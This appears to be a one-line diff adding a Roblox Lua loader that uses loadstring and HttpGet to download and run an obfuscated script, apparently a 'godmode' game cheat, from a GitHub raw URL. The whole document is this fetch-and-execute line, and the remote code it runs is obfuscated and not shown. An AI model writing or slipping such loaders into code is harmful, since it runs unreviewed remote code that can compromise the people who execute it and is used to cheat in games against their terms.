@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/calamansiiiii/godmodescript/refs/heads/main/sjshshdhehs-obfuscated.lua"))()
